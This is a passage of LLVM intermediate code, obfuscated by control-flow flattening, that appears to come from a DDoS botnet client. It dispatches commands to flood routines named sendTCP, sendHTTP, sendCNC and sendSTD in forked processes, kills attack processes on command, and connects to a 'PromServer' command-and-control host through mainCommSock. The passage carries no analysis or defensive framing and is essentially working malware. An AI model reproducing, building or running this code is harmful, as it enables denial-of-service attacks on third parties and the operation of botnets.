  %631 = icmp slt i32 %630, 1
  %632 = select i1 %631, i32 1657604929, i32 1612263320
  store i32 %632, i32* %switchVar
  br label %loopEnd

; <label>:633:                                    ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:634:                                    ; preds = %loopEntry
  %635 = load i8**, i8*** %4, align 8
  %636 = getelementptr inbounds i8*, i8** %635, i64 1
  %637 = load i8*, i8** %636, align 8
  store i8* %637, i8** %38, align 8
  %638 = load i8**, i8*** %4, align 8
  %639 = getelementptr inbounds i8*, i8** %638, i64 2
  %640 = load i8*, i8** %639, align 8
  %641 = call i32 @atoi(i8* %640) #10
  store i32 %641, i32* %39, align 4
  %642 = load i8**, i8*** %4, align 8
  %643 = getelementptr inbounds i8*, i8** %642, i64 3
  %644 = load i8*, i8** %643, align 8
  %645 = call i32 @atoi(i8* %644) #10
  store i32 %645, i32* %40, align 4
  %646 = load i8**, i8*** %4, align 8
  %647 = getelementptr inbounds i8*, i8** %646, i64 4
  %648 = load i8*, i8** %647, align 8
  %649 = call i32 @atoi(i8* %648) #10
  store i32 %649, i32* %41, align 4
  %650 = load i8**, i8*** %4, align 8
  %651 = getelementptr inbounds i8*, i8** %650, i64 5
  %652 = load i8*, i8** %651, align 8
  store i8* %652, i8** %42, align 8
  %653 = load i32, i32* %3, align 4
  %654 = icmp eq i32 %653, 8
  %655 = select i1 %654, i32 -1535220237, i32 -1358532085
  store i32 %655, i32* %switchVar
  br label %loopEnd

; <label>:656:                                    ; preds = %loopEntry
  %657 = load i8**, i8*** %4, align 8
  %658 = getelementptr inbounds i8*, i8** %657, i64 7
  %659 = load i8*, i8** %658, align 8
  %660 = call i32 @atoi(i8* %659) #10
  store i32 894691115, i32* %switchVar
  store i32 %660, i32* %.reg2mem8
  br label %loopEnd

; <label>:661:                                    ; preds = %loopEntry
  store i32 894691115, i32* %switchVar
  store i32 10, i32* %.reg2mem8
  br label %loopEnd

; <label>:662:                                    ; preds = %loopEntry
  %.reload9 = load i32, i32* %.reg2mem8
  store i32 %.reload9, i32* %43, align 4
  %663 = load i32, i32* %3, align 4
  %664 = icmp sgt i32 %663, 6
  %665 = select i1 %664, i32 -97336191, i32 1601621884
  store i32 %665, i32* %switchVar
  br label %loopEnd

; <label>:666:                                    ; preds = %loopEntry
  %667 = load i8**, i8*** %4, align 8
  %668 = getelementptr inbounds i8*, i8** %667, i64 6
  %669 = load i8*, i8** %668, align 8
  %670 = call i32 @atoi(i8* %669) #10
  store i32 -382722082, i32* %switchVar
  store i32 %670, i32* %.reg2mem10
  br label %loopEnd

; <label>:671:                                    ; preds = %loopEntry
  store i32 -382722082, i32* %switchVar
  store i32 0, i32* %.reg2mem10
  br label %loopEnd

; <label>:672:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  store i32 %.reload11, i32* %44, align 4
  %673 = load i8*, i8** %38, align 8
  %674 = call i8* @strstr(i8* %673, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #10
  %675 = icmp ne i8* %674, null
  %676 = select i1 %675, i32 -421605639, i32 1461792194
  store i32 %676, i32* %switchVar
  br label %loopEnd

; <label>:677:                                    ; preds = %loopEntry
  %678 = load i8*, i8** %38, align 8
  %679 = call i8* @strtok(i8* %678, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %679, i8** %45, align 8
  store i32 -206790261, i32* %switchVar
  br label %loopEnd

; <label>:680:                                    ; preds = %loopEntry
  %681 = load i8*, i8** %45, align 8
  %682 = icmp ne i8* %681, null
  %683 = select i1 %682, i32 -1787095151, i32 -1197001678
  store i32 %683, i32* %switchVar
  br label %loopEnd

; <label>:684:                                    ; preds = %loopEntry
  %685 = call i32 @listFork()
  %686 = icmp ne i32 %685, 0
  %687 = select i1 %686, i32 -1411514093, i32 -1665737454
  store i32 %687, i32* %switchVar
  br label %loopEnd

; <label>:688:                                    ; preds = %loopEntry
  %689 = load i8*, i8** %45, align 8
  %690 = load i32, i32* %39, align 4
  %691 = load i32, i32* %40, align 4
  %692 = load i32, i32* %41, align 4
  %693 = load i8*, i8** %42, align 8
  %694 = load i32, i32* %44, align 4
  %695 = load i32, i32* %43, align 4
  call void @sendTCP(i8* %689, i32 %690, i32 %691, i32 %692, i8* %693, i32 %694, i32 %695)
  call void @_exit(i32 0) #12
  unreachable

; <label>:696:                                    ; preds = %loopEntry
  %697 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %697, i8** %45, align 8
  store i32 -206790261, i32* %switchVar
  br label %loopEnd

; <label>:698:                                    ; preds = %loopEntry
  store i32 652102228, i32* %switchVar
  br label %loopEnd

; <label>:699:                                    ; preds = %loopEntry
  %700 = call i32 @listFork()
  %701 = icmp ne i32 %700, 0
  %702 = select i1 %701, i32 1130200024, i32 663155560
  store i32 %702, i32* %switchVar
  br label %loopEnd

; <label>:703:                                    ; preds = %loopEntry
  %704 = load i8*, i8** %38, align 8
  %705 = load i32, i32* %39, align 4
  %706 = load i32, i32* %40, align 4
  %707 = load i32, i32* %41, align 4
  %708 = load i8*, i8** %42, align 8
  %709 = load i32, i32* %44, align 4
  %710 = load i32, i32* %43, align 4
  call void @sendTCP(i8* %704, i32 %705, i32 %706, i32 %707, i8* %708, i32 %709, i32 %710)
  call void @_exit(i32 0) #12
  unreachable

; <label>:711:                                    ; preds = %loopEntry
  store i32 652102228, i32* %switchVar
  br label %loopEnd

; <label>:712:                                    ; preds = %loopEntry
  store i32 1028203205, i32* %switchVar
  br label %loopEnd

; <label>:713:                                    ; preds = %loopEntry
  %714 = load i8**, i8*** %4, align 8
  %715 = getelementptr inbounds i8*, i8** %714, i64 0
  %716 = load i8*, i8** %715, align 8
  %717 = call i32 @strcmp(i8* %716, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.531, i32 0, i32 0)) #10
  %718 = icmp ne i32 %717, 0
  %719 = select i1 %718, i32 1321309365, i32 -651235261
  store i32 %719, i32* %switchVar
  br label %loopEnd

; <label>:720:                                    ; preds = %loopEntry
  %721 = load i32, i32* %3, align 4
  %722 = icmp slt i32 %721, 6
  %723 = select i1 %722, i32 -1140832382, i32 -781875812
  store i32 %723, i32* %switchVar
  br label %loopEnd

; <label>:724:                                    ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:725:                                    ; preds = %loopEntry
  %726 = load i8**, i8*** %4, align 8
  %727 = getelementptr inbounds i8*, i8** %726, i64 1
  %728 = load i8*, i8** %727, align 8
  %729 = call i8* @strstr(i8* %728, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #10
  %730 = icmp ne i8* %729, null
  %731 = select i1 %730, i32 -1772471890, i32 -110857905
  store i32 %731, i32* %switchVar
  br label %loopEnd

; <label>:732:                                    ; preds = %loopEntry
  %733 = load i8**, i8*** %4, align 8
  %734 = getelementptr inbounds i8*, i8** %733, i64 1
  %735 = load i8*, i8** %734, align 8
  %736 = call i8* @strtok(i8* %735, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %736, i8** %46, align 8
  store i32 309285498, i32* %switchVar
  br label %loopEnd

; <label>:737:                                    ; preds = %loopEntry
  %738 = load i8*, i8** %46, align 8
  %739 = icmp ne i8* %738, null
  %740 = select i1 %739, i32 -1928704652, i32 -1062981962
  store i32 %740, i32* %switchVar
  br label %loopEnd

; <label>:741:                                    ; preds = %loopEntry
  %742 = call i32 @listFork()
  %743 = icmp ne i32 %742, 0
  %744 = select i1 %743, i32 1069316315, i32 1407466383
  store i32 %744, i32* %switchVar
  br label %loopEnd

; <label>:745:                                    ; preds = %loopEntry
  %746 = load i8**, i8*** %4, align 8
  %747 = getelementptr inbounds i8*, i8** %746, i64 1
  %748 = load i8*, i8** %747, align 8
  %749 = load i8**, i8*** %4, align 8
  %750 = getelementptr inbounds i8*, i8** %749, i64 2
  %751 = load i8*, i8** %750, align 8
  %752 = load i8**, i8*** %4, align 8
  %753 = getelementptr inbounds i8*, i8** %752, i64 3
  %754 = load i8*, i8** %753, align 8
  %755 = call i32 @atoi(i8* %754) #10
  %756 = trunc i32 %755 to i16
  %757 = load i8**, i8*** %4, align 8
  %758 = getelementptr inbounds i8*, i8** %757, i64 4
  %759 = load i8*, i8** %758, align 8
  %760 = load i8**, i8*** %4, align 8
  %761 = getelementptr inbounds i8*, i8** %760, i64 5
  %762 = load i8*, i8** %761, align 8
  %763 = call i32 @atoi(i8* %762) #10
  %764 = load i8**, i8*** %4, align 8
  %765 = getelementptr inbounds i8*, i8** %764, i64 6
  %766 = load i8*, i8** %765, align 8
  %767 = call i32 @atoi(i8* %766) #10
  call void @sendHTTP(i8* %748, i8* %751, i16 zeroext %756, i8* %759, i32 %763, i32 %767)
  call void @_exit(i32 0) #12
  unreachable

; <label>:768:                                    ; preds = %loopEntry
  %769 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %769, i8** %46, align 8
  store i32 309285498, i32* %switchVar
  br label %loopEnd

; <label>:770:                                    ; preds = %loopEntry
  store i32 -55457251, i32* %switchVar
  br label %loopEnd

; <label>:771:                                    ; preds = %loopEntry
  %772 = call i32 @listFork()
  %773 = icmp ne i32 %772, 0
  %774 = select i1 %773, i32 186645046, i32 -1578058161
  store i32 %774, i32* %switchVar
  br label %loopEnd

; <label>:775:                                    ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:776:                                    ; preds = %loopEntry
  %777 = load i8**, i8*** %4, align 8
  %778 = getelementptr inbounds i8*, i8** %777, i64 1
  %779 = load i8*, i8** %778, align 8
  %780 = load i8**, i8*** %4, align 8
  %781 = getelementptr inbounds i8*, i8** %780, i64 2
  %782 = load i8*, i8** %781, align 8
  %783 = load i8**, i8*** %4, align 8
  %784 = getelementptr inbounds i8*, i8** %783, i64 3
  %785 = load i8*, i8** %784, align 8
  %786 = call i32 @atoi(i8* %785) #10
  %787 = trunc i32 %786 to i16
  %788 = load i8**, i8*** %4, align 8
  %789 = getelementptr inbounds i8*, i8** %788, i64 4
  %790 = load i8*, i8** %789, align 8
  %791 = load i8**, i8*** %4, align 8
  %792 = getelementptr inbounds i8*, i8** %791, i64 5
  %793 = load i8*, i8** %792, align 8
  %794 = call i32 @atoi(i8* %793) #10
  %795 = load i8**, i8*** %4, align 8
  %796 = getelementptr inbounds i8*, i8** %795, i64 6
  %797 = load i8*, i8** %796, align 8
  %798 = call i32 @atoi(i8* %797) #10
  call void @sendHTTP(i8* %779, i8* %782, i16 zeroext %787, i8* %790, i32 %794, i32 %798)
  call void @_exit(i32 0) #12
  unreachable

; <label>:799:                                    ; preds = %loopEntry
  store i32 1321309365, i32* %switchVar
  br label %loopEnd

; <label>:800:                                    ; preds = %loopEntry
  %801 = load i8**, i8*** %4, align 8
  %802 = getelementptr inbounds i8*, i8** %801, i64 0
  %803 = load i8*, i8** %802, align 8
  %804 = call i32 @strcmp(i8* %803, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.532, i32 0, i32 0)) #10
  %805 = icmp ne i32 %804, 0
  %806 = select i1 %805, i32 -2092976722, i32 418771310
  store i32 %806, i32* %switchVar
  br label %loopEnd

; <label>:807:                                    ; preds = %loopEntry
  %808 = load i32, i32* %3, align 4
  %809 = icmp slt i32 %808, 4
  %810 = select i1 %809, i32 1464614058, i32 -905491481
  store i32 %810, i32* %switchVar
  br label %loopEnd

; <label>:811:                                    ; preds = %loopEntry
  %812 = load i8**, i8*** %4, align 8
  %813 = getelementptr inbounds i8*, i8** %812, i64 2
  %814 = load i8*, i8** %813, align 8
  %815 = call i32 @atoi(i8* %814) #10
  %816 = icmp slt i32 %815, 1
  %817 = select i1 %816, i32 1464614058, i32 -116221269
  store i32 %817, i32* %switchVar
  br label %loopEnd

; <label>:818:                                    ; preds = %loopEntry
  %819 = load i8**, i8*** %4, align 8
  %820 = getelementptr inbounds i8*, i8** %819, i64 3
  %821 = load i8*, i8** %820, align 8
  %822 = call i32 @atoi(i8* %821) #10
  %823 = icmp slt i32 %822, 1
  %824 = select i1 %823, i32 1464614058, i32 -964177942
  store i32 %824, i32* %switchVar
  br label %loopEnd

; <label>:825:                                    ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:826:                                    ; preds = %loopEntry
  %827 = load i8**, i8*** %4, align 8
  %828 = getelementptr inbounds i8*, i8** %827, i64 1
  %829 = load i8*, i8** %828, align 8
  store i8* %829, i8** %47, align 8
  %830 = load i8**, i8*** %4, align 8
  %831 = getelementptr inbounds i8*, i8** %830, i64 2
  %832 = load i8*, i8** %831, align 8
  %833 = call i32 @atoi(i8* %832) #10
  store i32 %833, i32* %48, align 4
  %834 = load i8**, i8*** %4, align 8
  %835 = getelementptr inbounds i8*, i8** %834, i64 3
  %836 = load i8*, i8** %835, align 8
  %837 = call i32 @atoi(i8* %836) #10
  store i32 %837, i32* %49, align 4
  %838 = load i8*, i8** %47, align 8
  %839 = call i8* @strstr(i8* %838, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #10
  %840 = icmp ne i8* %839, null
  %841 = select i1 %840, i32 -1086779890, i32 488281592
  store i32 %841, i32* %switchVar
  br label %loopEnd

; <label>:842:                                    ; preds = %loopEntry
  %843 = load i8*, i8** %47, align 8
  %844 = call i8* @strtok(i8* %843, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %844, i8** %50, align 8
  store i32 -1160974028, i32* %switchVar
  br label %loopEnd

; <label>:845:                                    ; preds = %loopEntry
  %846 = load i8*, i8** %50, align 8
  %847 = icmp ne i8* %846, null
  %848 = select i1 %847, i32 649599254, i32 -2073392312
  store i32 %848, i32* %switchVar
  br label %loopEnd

; <label>:849:                                    ; preds = %loopEntry
  %850 = call i32 @listFork()
  %851 = icmp ne i32 %850, 0
  %852 = select i1 %851, i32 -804384504, i32 593799310
  store i32 %852, i32* %switchVar
  br label %loopEnd

; <label>:853:                                    ; preds = %loopEntry
  %854 = load i8*, i8** %50, align 8
  %855 = load i32, i32* %48, align 4
  %856 = load i32, i32* %49, align 4
  call void @sendCNC(i8* %854, i32 %855, i32 %856)
  %857 = load i32, i32* @mainCommSock, align 4
  %858 = call i32 @close(i32 %857)
  call void @_exit(i32 0) #12
  unreachable

; <label>:859:                                    ; preds = %loopEntry
  %860 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %860, i8** %50, align 8
  store i32 -1160974028, i32* %switchVar
  br label %loopEnd

; <label>:861:                                    ; preds = %loopEntry
  store i32 2018689460, i32* %switchVar
  br label %loopEnd

; <label>:862:                                    ; preds = %loopEntry
  %863 = call i32 @listFork()
  %864 = icmp ne i32 %863, 0
  %865 = select i1 %864, i32 413857173, i32 -725799605
  store i32 %865, i32* %switchVar
  br label %loopEnd

; <label>:866:                                    ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:867:                                    ; preds = %loopEntry
  %868 = load i8*, i8** %47, align 8
  %869 = load i32, i32* %48, align 4
  %870 = load i32, i32* %49, align 4
  call void @sendCNC(i8* %868, i32 %869, i32 %870)
  call void @_exit(i32 0) #12
  unreachable

; <label>:871:                                    ; preds = %loopEntry
  store i32 -2092976722, i32* %switchVar
  br label %loopEnd

; <label>:872:                                    ; preds = %loopEntry
  %873 = load i8**, i8*** %4, align 8
  %874 = getelementptr inbounds i8*, i8** %873, i64 0
  %875 = load i8*, i8** %874, align 8
  %876 = call i32 @strcmp(i8* %875, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.533, i32 0, i32 0)) #10
  %877 = icmp ne i32 %876, 0
  %878 = select i1 %877, i32 -96096008, i32 1276038129
  store i32 %878, i32* %switchVar
  br label %loopEnd

; <label>:879:                                    ; preds = %loopEntry
  %880 = load i32, i32* %3, align 4
  %881 = icmp slt i32 %880, 4
  %882 = select i1 %881, i32 -1095046152, i32 -1031901392
  store i32 %882, i32* %switchVar
  br label %loopEnd

; <label>:883:                                    ; preds = %loopEntry
  %884 = load i8**, i8*** %4, align 8
  %885 = getelementptr inbounds i8*, i8** %884, i64 2
  %886 = load i8*, i8** %885, align 8
  %887 = call i32 @atoi(i8* %886) #10
  %888 = icmp slt i32 %887, 1
  %889 = select i1 %888, i32 -1095046152, i32 1823108326
  store i32 %889, i32* %switchVar
  br label %loopEnd

; <label>:890:                                    ; preds = %loopEntry
  %891 = load i8**, i8*** %4, align 8
  %892 = getelementptr inbounds i8*, i8** %891, i64 3
  %893 = load i8*, i8** %892, align 8
  %894 = call i32 @atoi(i8* %893) #10
  %895 = icmp slt i32 %894, 1
  %896 = select i1 %895, i32 -1095046152, i32 -621969226
  store i32 %896, i32* %switchVar
  br label %loopEnd

; <label>:897:                                    ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:898:                                    ; preds = %loopEntry
  %899 = load i8**, i8*** %4, align 8
  %900 = getelementptr inbounds i8*, i8** %899, i64 1
  %901 = load i8*, i8** %900, align 8
  store i8* %901, i8** %51, align 8
  %902 = load i8**, i8*** %4, align 8
  %903 = getelementptr inbounds i8*, i8** %902, i64 2
  %904 = load i8*, i8** %903, align 8
  %905 = call i32 @atoi(i8* %904) #10
  store i32 %905, i32* %52, align 4
  %906 = load i8**, i8*** %4, align 8
  %907 = getelementptr inbounds i8*, i8** %906, i64 3
  %908 = load i8*, i8** %907, align 8
  %909 = call i32 @atoi(i8* %908) #10
  store i32 %909, i32* %53, align 4
  %910 = load i8*, i8** %51, align 8
  %911 = call i8* @strstr(i8* %910, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #10
  %912 = icmp ne i8* %911, null
  %913 = select i1 %912, i32 383164078, i32 431683507
  store i32 %913, i32* %switchVar
  br label %loopEnd

; <label>:914:                                    ; preds = %loopEntry
  %915 = load i8*, i8** %51, align 8
  %916 = call i8* @strtok(i8* %915, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %916, i8** %54, align 8
  store i32 -1965886964, i32* %switchVar
  br label %loopEnd

; <label>:917:                                    ; preds = %loopEntry
  %918 = load i8*, i8** %54, align 8
  %919 = icmp ne i8* %918, null
  %920 = select i1 %919, i32 2045513523, i32 360423163
  store i32 %920, i32* %switchVar
  br label %loopEnd

; <label>:921:                                    ; preds = %loopEntry
  %922 = call i32 @listFork()
  %923 = icmp ne i32 %922, 0
  %924 = select i1 %923, i32 15438023, i32 -524196663
  store i32 %924, i32* %switchVar
  br label %loopEnd

; <label>:925:                                    ; preds = %loopEntry
  %926 = load i8*, i8** %54, align 8
  %927 = load i32, i32* %52, align 4
  %928 = load i32, i32* %53, align 4
  call void @sendSTD(i8* %926, i32 %927, i32 %928)
  call void @_exit(i32 0) #12
  unreachable

; <label>:929:                                    ; preds = %loopEntry
  %930 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %930, i8** %54, align 8
  store i32 -1965886964, i32* %switchVar
  br label %loopEnd

; <label>:931:                                    ; preds = %loopEntry
  store i32 -692928319, i32* %switchVar
  br label %loopEnd

; <label>:932:                                    ; preds = %loopEntry
  %933 = call i32 @listFork()
  %934 = icmp ne i32 %933, 0
  %935 = select i1 %934, i32 776803993, i32 -1192670649
  store i32 %935, i32* %switchVar
  br label %loopEnd

; <label>:936:                                    ; preds = %loopEntry
  store i32 980613711, i32* %switchVar
  br label %loopEnd

; <label>:937:                                    ; preds = %loopEntry
  %938 = load i8*, i8** %51, align 8
  %939 = load i32, i32* %52, align 4
  %940 = load i32, i32* %53, align 4
  call void @sendSTD(i8* %938, i32 %939, i32 %940)
  call void @_exit(i32 0) #12
  unreachable

; <label>:941:                                    ; preds = %loopEntry
  store i32 -96096008, i32* %switchVar
  br label %loopEnd

; <label>:942:                                    ; preds = %loopEntry
  %943 = load i8**, i8*** %4, align 8
  %944 = getelementptr inbounds i8*, i8** %943, i64 0
  %945 = load i8*, i8** %944, align 8
  %946 = call i32 @strcmp(i8* %945, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.534, i32 0, i32 0)) #10
  %947 = icmp ne i32 %946, 0
  %948 = select i1 %947, i32 1647802241, i32 1661510266
  store i32 %948, i32* %switchVar
  br label %loopEnd

; <label>:949:                                    ; preds = %loopEntry
  store i32 0, i32* %55, align 4
  store i64 0, i64* %56, align 8
  store i32 -207769032, i32* %switchVar
  br label %loopEnd

; <label>:950:                                    ; preds = %loopEntry
  %951 = load i64, i64* %56, align 8
  %952 = load i64, i64* @numpids, align 8
  %953 = icmp ult i64 %951, %952
  %954 = select i1 %953, i32 817770804, i32 -358312445
  store i32 %954, i32* %switchVar
  br label %loopEnd

; <label>:955:                                    ; preds = %loopEntry
  %956 = load i32*, i32** @pids, align 8
  %957 = load i64, i64* %56, align 8
  %958 = getelementptr inbounds i32, i32* %956, i64 %957
  %959 = load i32, i32* %958, align 4
  %960 = icmp ne i32 %959, 0
  %961 = select i1 %960, i32 1111415679, i32 1200270716
  store i32 %961, i32* %switchVar
  br label %loopEnd

; <label>:962:                                    ; preds = %loopEntry
  %963 = load i32*, i32** @pids, align 8
  %964 = load i64, i64* %56, align 8
  %965 = getelementptr inbounds i32, i32* %963, i64 %964
  %966 = load i32, i32* %965, align 4
  %967 = call i32 @getpid() #2
  %968 = icmp ne i32 %966, %967
  %969 = select i1 %968, i32 -1286672765, i32 1200270716
  store i32 %969, i32* %switchVar
  br label %loopEnd

; <label>:970:                                    ; preds = %loopEntry
  %971 = load i32*, i32** @pids, align 8
  %972 = load i64, i64* %56, align 8
  %973 = getelementptr inbounds i32, i32* %971, i64 %972
  %974 = load i32, i32* %973, align 4
  %975 = call i32 @kill(i32 %974, i32 9) #2
  %976 = load i32, i32* %55, align 4
  %977 = add nsw i32 %976, 1
  store i32 %977, i32* %55, align 4
  store i32 1200270716, i32* %switchVar
  br label %loopEnd

; <label>:978:                                    ; preds = %loopEntry
  store i32 171492976, i32* %switchVar
  br label %loopEnd

; <label>:979:                                    ; preds = %loopEntry
  %980 = load i64, i64* %56, align 8
  %981 = add i64 %980, 1
  store i64 %981, i64* %56, align 8
  store i32 -207769032, i32* %switchVar
  br label %loopEnd

; <label>:982:                                    ; preds = %loopEntry
  %983 = load i32, i32* %55, align 4
  %984 = icmp sgt i32 %983, 0
  %985 = select i1 %984, i32 1153960891, i32 382664979
  store i32 %985, i32* %switchVar
  br label %loopEnd

; <label>:986:                                    ; preds = %loopEntry
  %987 = load i32, i32* @mainCommSock, align 4
  %988 = load i32, i32* %55, align 4
  %989 = call i32 (i32, i8*, ...) @sockprintf(i32 %987, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.535, i32 0, i32 0), i32 %988)
  store i32 -1386992580, i32* %switchVar
  br label %loopEnd

; <label>:990:                                    ; preds = %loopEntry
  %991 = load i32, i32* @mainCommSock, align 4
  %992 = call i32 (i32, i8*, ...) @sockprintf(i32 %991, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.536, i32 0, i32 0))
  store i32 -1386992580, i32* %switchVar
  br label %loopEnd

; <label>:993:                                    ; preds = %loopEntry
  store i32 1647802241, i32* %switchVar
  br label %loopEnd

; <label>:994:                                    ; preds = %loopEntry
  %995 = load i8**, i8*** %4, align 8
  %996 = getelementptr inbounds i8*, i8** %995, i64 0
  %997 = load i8*, i8** %996, align 8
  %998 = call i32 @strcmp(i8* %997, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.537, i32 0, i32 0)) #10
  %999 = icmp ne i32 %998, 0
  %1000 = select i1 %999, i32 980613711, i32 -454565221
  store i32 %1000, i32* %switchVar
  br label %loopEnd

; <label>:1001:                                   ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:1002:                                   ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %994, %993, %990, %986, %982, %979, %978, %970, %962, %955, %950, %949, %942, %941, %936, %932, %931, %929, %921, %917, %914, %898, %897, %890, %883, %879, %872, %871, %866, %862, %861, %859, %849, %845, %842, %826, %825, %818, %811, %807, %800, %799, %775, %771, %770, %768, %741, %737, %732, %725, %724, %720, %713, %712, %711, %699, %698, %696, %684, %680, %677, %672, %671, %666, %662, %661, %656, %634, %633, %626, %622, %615, %611, %604, %597, %590, %583, %579, %572, %571, %570, %557, %556, %554, %541, %537, %534, %529, %528, %523, %519, %518, %513, %509, %508, %503, %480, %479, %472, %468, %461, %454, %447, %440, %433, %426, %419, %415, %408, %407, %385, %384, %380, %373, %351, %350, %346, %339, %317, %316, %312, %305, %283, %282, %278, %271, %249, %248, %244, %237, %215, %214, %210, %203, %181, %180, %176, %169, %162, %161, %154, %153, %144, %137, %136, %128, %127, %123, %121, %116, %115, %111, %104, %99, %98, %94, %87, %80, %79, %72, %71, %64, %63, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 22921600, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 22921600, label %first
    i32 1756537453, label %8
    i32 -508468440, label %11
    i32 -1905750994, label %17
    i32 780755016, label %18
    i32 2029432563, label %21
    i32 1523896156, label %32
    i32 1387516091, label %39
    i32 260149029, label %47
    i32 -220802452, label %48
    i32 -34862282, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp ne i32 %.reload, 0
  %7 = select i1 %6, i32 1756537453, i32 -508468440
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* @mainCommSock, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* @mainCommSock, align 4
  store i32 -508468440, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* @currentServer, align 4
  %13 = add nsw i32 %12, 1
  %14 = sext i32 %13 to i64
  %15 = icmp eq i64 %14, 1
  %16 = select i1 %15, i32 -1905750994, i32 780755016
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* @currentServer, align 4
  store i32 2029432563, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* @currentServer, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* @currentServer, align 4
  store i32 2029432563, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %23 = load i32, i32* @currentServer, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [1 x i8*], [1 x i8*]* @PromServer, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = call i8* @strcpy(i8* %22, i8* %26) #2
  store i32 27, i32* %3, align 4
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %29 = call i8* @strchr(i8* %28, i32 58) #10
  %30 = icmp ne i8* %29, null
  %31 = select i1 %30, i32 1523896156, i32 1387516091
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %34 = call i8* @strchr(i8* %33, i32 58) #10
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @atoi(i8* %35) #10
  store i32 %36, i32* %3, align 4
  %37 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %38 = call i8* @strchr(i8* %37, i32 58) #10
  store i8 0, i8* %38, align 1
  store i32 1387516091, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %40, i32* @mainCommSock, align 4
  %41 = load i32, i32* @mainCommSock, align 4
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %43 = load i32, i32* %3, align 4
  %44 = call i32 @connectTimeout(i32 %41, i8* %42, i32 %43, i32 30)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 -220802452, i32 260149029
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 -34862282, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
